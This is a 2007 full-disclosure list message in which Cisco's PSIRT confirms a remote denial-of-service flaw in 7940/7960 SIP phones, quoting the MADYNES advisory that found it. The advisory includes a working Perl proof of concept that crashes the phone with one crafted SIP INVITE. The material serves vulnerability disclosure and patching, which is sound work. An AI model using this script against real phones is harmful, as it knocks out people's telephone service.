
Date: Tue, 20 Mar 2007 09:53:33 -0500
From: Matthew Cerha <mcerha@...co.com>
To: Radu State <state@...ia.fr>
Cc: full-disclosure@...ts.grok.org.uk
Subject: Re: CISCO  Phone 7940 DOS vulnerability

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

This is in response to the e-mail posted by Radu State. The original
e-mail is available at

http://lists.grok.org.uk/pipermail/full-disclosure/2007-March/053070.html

Hi Radu,

Thanks for reporting this issue to Cisco's Product Security Incident
Response Team (PSIRT).

We have confirmed your findings with the 7940/60 SIP P0S3-07-4-00
firmware. Cisco has also confirmed that firmware version 8.6(0)
(POS8-6-0) is not vulnerable to this issue. The latest firmware images
for Cisco 7940/60 phones can be obtained here:

http://www.cisco.com/cgi-bin/tablebuild.pl/ip-7900ser

We are always open for vulnerability reports regarding any Cisco
products. Such reports can be directly sent to us at psirt@...co.com or
to security-alert@...co.com in case of an emergency.

Best regards,

Matthew Cerha
Cisco Systems

Radu State wrote:
> MADYNES Security Advisory 
> 
> 
> http://madynes.loria.fr
> 
> 
> 
> Severity: High
> 
> Title: Cisco 7940 SIP INVITE remote DOS 
> 
> Date: February 19, 2007
> 
> ID: KIPH2
> 
> 
> Synopsis: After sending a cra fted INVITE message the device immediately
> reboots. The phone does not check properly the sipURI field of the
> Remote-Party-ID in the message.
> 
> The vendor was informed and acknowledged the vulnerability. This
> vulnerability was identified by the Madynes research team at INRIA
> Lorraine, using the Madynes VoIP fuzzer.
> 
> 
> Background: SIP is the IETF standardized (RFCs 2543 and 3261) protocol
> for VoIP signalization. SIP is an ASCII based INVITE message is used to
> initiate and maintain a communication session. 
> 
> 
> Affected devices: Cisco phone 7940/7960 running firmware P0S3-07-4-00
> 
> 
> Unaffected: devices running firmware POS8-6-0
> 
> 
> 
> Proof of Concept Code: 
> 
> 
> #!/usr/bin/perl
> 
> use IO::Socket::INET;
> 
> die "Usage $0 <dst> <port> <username>" unless ($ARGV[2]);
> 
> 
> $socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],
> 
> Proto=>'udp',
> 
> PeerAddr=>$ARGV[0]);
> 
> 
> $msg="INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP
> 192.168.1.2;branch=z9hG4jk\r\nFrom: sip:chirimolla
> \@192.168.1.2;tag=qwzng\r\nTo: <sip:$ARGV[2]\@$ARGV[0];user=ip>\r
> \nCall-ID: fosforito\@192.168.1.1\r\nCSeq: 921 INVITE\r
> \nRemote-Party-ID: csip:7940-1\@192.168.\xd1.7\r\n\r\n";
> 
> $socket->send($msg);
> 
> 
> 
> Description: After receiving one crafted SIP INVITE message, the
> affected device reboots immediately. The proof of concept code can be
> used to demonstrate the vulnerability.
> 
> 
> 
> Impact 
> 
> A malicious user can remotely crash and perform a denial of service
> attack by sending one crafted SIP INVITE message. This is conceptually
> similar to the “ping of death”. 
> 
> 
> Resolution:
> 
> Fixed software is available from the vendor and customers following
> recommended best practices (ie segregating VOIP traffic from data) will
> be protected from malicious traffic in most situations. 
> 
> 
> 
> 
> 
> 
> 
> Credits:
> 
> Humberto J. Abdelnur (Ph.D Student)
> 
> Radu State (Ph.D)
> 
> Olivier Festor (Ph.D)
> 
> This vulnerability was identified by the Madynes research team at INRIA
> 
> Lorraine, using the Madynes VoIP fuzzer.
> 
> http://madynes.loria.fr/
> 
> 
> 
> 
> Information about us: Madynes is a research team at INRIA Lorraine
> working on VoIP Security assessment, intrusion detection and prevention.
> 
> _______________________________________________
> Full-Disclosure - We believe in it.
> Charter: http://lists.grok.org.uk/full-disclosure-charter.html
> Hosted and sponsored by Secunia - http://secunia.com/
> 
-----BEGIN PGP SIGNATURE-----

iD8DBQFF//VtllAcl+pm5SIRAoLmAJ4qVYWpjzDRwLL46JoLBB0WToyvaQCg1BL7
+zY0SNXn+xgI7Y2HP3wZHNk=
=wAZI
-----END PGP SIGNATURE-----

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/